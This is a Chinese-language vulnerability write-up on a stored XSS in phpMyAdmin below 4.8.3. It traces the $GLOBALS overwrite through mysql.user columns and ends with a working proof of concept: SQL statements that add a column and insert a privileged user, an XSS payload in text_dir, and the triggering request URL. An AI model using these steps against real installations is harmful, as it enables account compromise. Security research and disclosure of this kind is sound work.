<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>Phpmyadmin &lt; 4.8.3 XSS</h1><h2>一、漏洞简介</h2><p>最近在审计phpmyadmin的时候发现了一个XSS漏洞，后来发现在版本大于4.8.3以后该漏洞被修复了。看了下之前公布的CVE，有个CVE和此漏洞很相似但没有漏洞细节，于是乎便有了这篇文章。</p><h2>二、漏洞影响</h2><p>Phpmyadmin &lt; 4.8.3</p><h2>三、复现过程</h2><p>在审计phpmyadmin时，我比较关注$GLOBALS全局变量，该变量存储了本次请求的信息、phpmyadmin基本设置信息和phpmyadmin配置文件信息等。先看看/libraries/classes/Server/Privileges.php::3977的以下代码。</p><p>foreach ($row as $key =&gt; $value) {<br />    $GLOBALS[$key] = $value;<br />}</p><p>很明显，该处是$GLOBALS的赋值操作，而$row来自于对mysql.user表的查询结果，且$user_host_condition可控，<br />/libraries/classes/Server/Privileges.php::3966行</p><p>public static function getDataForChangeOrCopyUser()<br />    {<br />        $queries = null;<br />        $password = null;<br /><br />        if (isset($_REQUEST['change_copy'])) {<br />            $user_host_condition = ' WHERE `User` = '<br />                . &quot;'&quot; . $GLOBALS['dbi']-&gt;escapeString($_REQUEST['old_username']) . &quot;'&quot;<br />                . ' AND `Host` = '<br />                . &quot;'&quot; . $GLOBALS['dbi']-&gt;escapeString($_REQUEST['old_hostname']) . &quot;';&quot;;<br />            $row = $GLOBALS['dbi']-&gt;fetchSingleRow(<br />                'SELECT * FROM `mysql`.`user` ' . $user_host_condition<br />            );</p><p>既然上述代码会将mysql.user中符合条件的行的列名和值写入$GLOBALS中,我们便可通过添加mysql.user的列来往$GLOBALS中写入任意键值。清楚思路后，我们看看哪里调用了Privileges.php的getDataForChangeOrCopyUser函数,发现在server_privileges.php::178中对该函数有调用。</p><p>list($queries, $password) = Privileges::getDataForChangeOrCopyUser();</p><p>这时我们来试试向$GLOBALS中写一个$GLOBALS['xz']='aliyun'。进入mysql库，执行以下2条sql语句向user表添加xz字段，并插入一条数据。</p><p>ALTER TABLE user ADD xz varchar(255);<br />INSERT INTO `user` (`Host`, `User`, `Password`, `Select_priv`, `Insert_priv`, `Update_priv`, `Delete_priv`, `Create_priv`, `Drop_priv`, `Reload_priv`, `Shutdown_priv`, `Process_priv`, `File_priv`, `Grant_priv`, `References_priv`, `Index_priv`, `Alter_priv`, `Show_db_priv`, `Super_priv`, `Create_tmp_table_priv`, `Lock_tables_priv`, `Execute_priv`, `Repl_slave_priv`, `Repl_client_priv`, `Create_view_priv`, `Show_view_priv`, `Create_routine_priv`, `Alter_routine_priv`, `Create_user_priv`, `Event_priv`, `Trigger_priv`, `Create_tablespace_priv`, `ssl_type`, `max_questions`, `max_updates`, `max_connections`, `max_user_connections`, `plugin`, `authentication_string`, `xz`) VALUES ('127.0.0.1', 'test', '*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '0', '0', '0', '0', '', '', 'aliyun');</p><p>在/libraries/classes/Server/Privileges.php::3980下断点</p><p>$serverVersion = $GLOBALS['dbi']-&gt;getVersion();</p><p>然后构造http://127.0.0.1/phpMyAdmin-4.8.2/server_privileges.php?change_copy=aa&amp;old_username=test&amp;old_hostname=127.0.0.1&amp;mode=5 参数请求，change_copy随便给个参数即可，mode必须大于4否则新添加的数据会被删除。</p><p>1.png<br />可以看到$GLOBALS['xz']='aliyun'已经成功赋值。</p><h3>利用构造</h3><p>有了可控的$GLOBALS变量后，我们需要寻找触发点。要在一次请求便触发漏洞，公共页面是首选目标。通过全局搜索$GLOBALS变量，发现在libraries/classes/Navigation/NavigationTree.php::1272的renderDbSelect函数中有使用未过滤的$GLOBALS变量。</p><p>$retval .= '&lt;div&gt;';<br />        $retval .= '&lt;form action=&quot;index.php&quot;&gt;';<br />        $retval .= Url::getHiddenFields($url_params);<br />        $retval .= '&lt;select name=&quot;db&quot; class=&quot;hide&quot; id=&quot;navi_db_select&quot;&gt;'<br />            . '&lt;option value=&quot;&quot; dir=&quot;' . $GLOBALS['text_dir'] . '&quot;&gt;'</p><p>继续搜索调用renderDbSelect函数地方，发现libraries\classes\Navigation\Navigation.php::62的getDisplay函数。</p><p>public function getDisplay()<br />    {<br />        /* Init */<br />        $retval = '';<br />        $response = Response::getInstance();<br />        if (! $response-&gt;isAjax()) {<br />            $header = new NavigationHeader();<br />            $retval = $header-&gt;getDisplay();<br />        }<br />        $tree = new NavigationTree();<br />        if (! $response-&gt;isAjax()<br />            || ! empty($_REQUEST['full'])<br />            || ! empty($_REQUEST['reload'])<br />        ) {<br />            if ($GLOBALS['cfg']['ShowDatabasesNavigationAsTree']) {<br />                // provide database tree in navigation<br />                $navRender = $tree-&gt;renderState();<br />            } else {<br />                // provide legacy pre-4.0 navigation<br />                $navRender = $tree-&gt;renderDbSelect();</p><p>继续搜索实例化Naviagtion类并且调用了getDisplay函数的地方，发现libraries\classes\Header.php::440的getDisplay函数有调用。</p><p>public function getDisplay()<br />    {<br />        $retval = '';<br />        ...(省略)<br />                if ($this-&gt;_menuEnabled &amp;&amp; $GLOBALS['server'] &gt; 0) {<br />                    $nav = new Navigation();<br />                    $retval .= $nav-&gt;getDisplay();<br />                }</p><p>搜索实例化Header-&gt;GetDisplay的方法，发现\libraries\classes\Response.php::100的构造方法中实例化了Header类，而$this-_header又在_getDisplay中被调用。_getDisplay被_htmlResponse调用，_htmlResponse在response函数中被调用。</p><p>private function __construct()<br />    {<br />        if (! defined('TESTSUITE')) {<br />            $buffer = OutputBuffering::getInstance();<br />            $buffer-&gt;start();<br />            register_shutdown_function(array($this, 'response'));<br />        }<br />        $this-&gt;_header = new Header();<br />        $this-&gt;_HTML   = '';<br />        $this-&gt;_JSON   = array();</p><p>\libraries\classes\Response.php::266行</p><p>private function _getDisplay()<br />    {<br />        // The header may contain nothing at all,<br />        // if its content was already rendered<br />        // and, in this case, the header will be<br />        // in the content part of the request<br />        $retval  = $this-&gt;_header-&gt;getDisplay();<br />        $retval .= $this-&gt;_HTML;<br />        $retval .= $this-&gt;_footer-&gt;getDisplay();<br />        return $retval;<br />    }</p><p>\libraries\classes\Response.php::279行</p><p>private function _htmlResponse()<br />    {<br />        echo $this-&gt;_getDisplay();<br />    }</p><p>\libraries\classes\Response.php::438行</p><p>public function response()<br />    {<br />        chdir($this-&gt;getCWD());<br />        $buffer = OutputBuffering::getInstance();<br />        if (empty($this-&gt;_HTML)) {<br />            $this-&gt;_HTML = $buffer-&gt;getContents();<br />        }<br />        if ($this-&gt;isAjax()) {<br />            $this-&gt;_ajaxResponse();<br />        } else {<br />            $this-&gt;_htmlResponse();<br />        }<br />        $buffer-&gt;flush();<br />        exit;<br />    }</p><p>这里注意__construct中的register_shutdown_function函数，看php manual，意思是说当脚本运行结束或遇到exit后会执行该response函数，<br />2.png<br /><strong>意思就是说只要哪里实例化了Response类，在程序运行结束后就会执行response函数</strong>。真好，回到server_privileges.php::34行，发现有实例化Response。</p><p>$response = Response::getInstance();<br />$header   = $response-&gt;getHeader();<br />$scripts  = $header-&gt;getScripts();</p><p>拥有以上调用链后，只需要控制$GLOBAS的键为text_dir,值为XSS payload即可，进入mysql库，执行以下sql语句修改列名xz为text_dir，并修改数据为XSS Payload。</p><p>ALTER TABLE `user` CHANGE `xz` `text_dir` VARCHAR(255) CHARACTER SET utf8 COLLATE utf8_bin NULL DEFAULT NULL;<br />UPDATE `user` SET `text_dir` = '\&quot;&gt;&lt;img src&gt;&lt;option dir=\&quot;' WHERE `user`.`Host` = '127.0.0.1' AND `user`.`User` = 'test';</p><p>构造<strong>http://www.0-sec.org/phpMyAdmin-4.8.2/server_privileges.php?change_copy=aa&amp;old_username=test&amp;old_hostname=127.0.0.1&amp;mode=5</strong><br />3.png<br />成功触发XSS</p><h2>参考链接</h2><p>https://xz.aliyun.com/t/7797</p></body></html>